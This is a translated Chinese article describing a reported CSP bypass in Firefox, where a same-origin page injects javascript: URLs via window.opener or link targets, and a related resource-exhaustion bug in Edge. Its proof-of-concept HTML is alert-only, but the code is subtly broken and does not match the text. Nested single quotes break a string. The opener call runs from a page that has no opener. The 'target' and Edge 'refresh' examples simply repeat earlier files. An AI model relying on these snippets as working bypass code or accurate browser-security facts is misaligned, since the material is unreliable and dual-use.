# Firefox与Edge的DOM策略导致的CSP绕过问题

##### 译文声明
本文为翻译文章，仅供参考。具体内容和含义以原文为准。

在2018年对内容安全策略（CSP）的研究中，我发现可以通过其他DOM向设置了CSP的DOM注入JavaScript协议，从而绕过CSP的安全防护机制。

### CSP设置方式
众所周知，CSP有两种设置方法：
1. 通过浏览器响应头设置，例如：
   ```http
   Content-Security-Policy: script-src 'self' https://apis.google.com
   ```
2. 通过HTML标签设置，例如：
   ```html
   <meta http-equiv="Content-Security-Policy" content="script-src 'self' https://apis.google.com">
   ```

### 发现的问题
如果某页面设置了CSP，而同源下的其他页面未设置CSP防御，则黑客可以利用`opener`和`target`对象对该页面进行攻击。不了解这两个对象的同学可以参考相关文献或我之前的文章。

### 示例：使用`opener`对象
为了演示这个问题，我们创建两个文件：`go.html` 和 `attack.html`。

**go.html**
```html
<!DOCTYPE html>
<html>
<head>
  <title>CSP Test</title>
  <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
</head>
<body>
  <a href="javascript:alert('csp_let's_go')">csp_let's_go</a>
  <script>
    // 由于CSP限制，这段代码不会执行
    alert('csp go');
  </script>
</body>
</html>
```

**attack.html**
```html
<!DOCTYPE html>
<html>
<head>
  <title>Attack Page</title>
</head>
<body>
  <a href="go.html" target="_blank">Go to CSP Test</a>
  <script>
    window.opener.alert('csp_let's_go');
  </script>
</body>
</html>
```

将这两个文件放在同一个目录下，你会发现，在Firefox中点击`csp_let's_go`链接时，JS代码会执行，这是因为Firefox对`opener`对象没有做相应的防护。而在Chrome、Edge和Safari中，这种行为是被禁止的。

### 使用`target`对象
同样的方法也可以用于`target`对象。我们创建两个文件：`go.html` 和 `target.html`。

**go.html**
```html
<!DOCTYPE html>
<html>
<head>
  <title>CSP Test</title>
  <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
</head>
<body>
  <a href="javascript:alert('csp bypass')">csp bypass</a>
  <script>
    // 由于CSP限制，这段代码不会执行
    alert('csp go');
  </script>
</body>
</html>
```

**target.html**
```html
<!DOCTYPE html>
<html>
<head>
  <title>Target Page</title>
</head>
<body>
  <a href="go.html" target="_blank">Go to CSP Test</a>
  <script>
    window.opener.alert('csp bypass');
  </script>
</body>
</html>
```

这种方法同样可以绕过Firefox的CSP策略。

### 火狐的回应
对于这些漏洞，火狐团队回复如下：
“一方面，这是向另一个文档注入JavaScript URL的行为，理应被阻止。另一方面，这种情况并不令人过分担忧，因为`parent.window.opener.alert(location.href)`是完全有效的——脚本是在允许其运行的上下文中执行，并且操作的是同源策略允许的DOM。”

### Edge中的类似问题
在Edge中测试上述代码时，我发现系统资源（CPU和内存）被大量占用。通过调试台，我发现`go.html`不断向`target.html`抛出JavaScript协议，但由于CSP策略，`target.html`不断拒绝这些请求。`go.html`会重新发起被拒绝的请求，加上时间函数累积的请求，导致请求呈指数增长，最终耗尽系统资源。

在这种情况下，刷新页面可以绕过CSP：
```html
<!DOCTYPE html>
<html>
<head>
  <title>CSP Test</title>
  <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
</head>
<body>
  <a href="javascript:alert('csp_let's_go')">csp_let's_go</a>
  <script>
    // 由于CSP限制，这段代码不会执行
    alert('csp go');
  </script>
</body>
</html>
```

虽然用户需要主动刷新页面或操作DOM才能触发该问题，但我们可以模拟刷新来验证这个Bug。

### 结论
推测Edge为了性能优化，在确定域是同源策略所允许的情况下，不等待网页加载完成就执行了JS语句。大多数情况下这不会出现问题，但由于前述Bug导致了过多线程累积，触发了资源耗尽的问题。尽管微软已经对控制台资源消耗进行了定时清理，但这个问题依然存在，不过攻击面非常狭窄，可以忽略不计。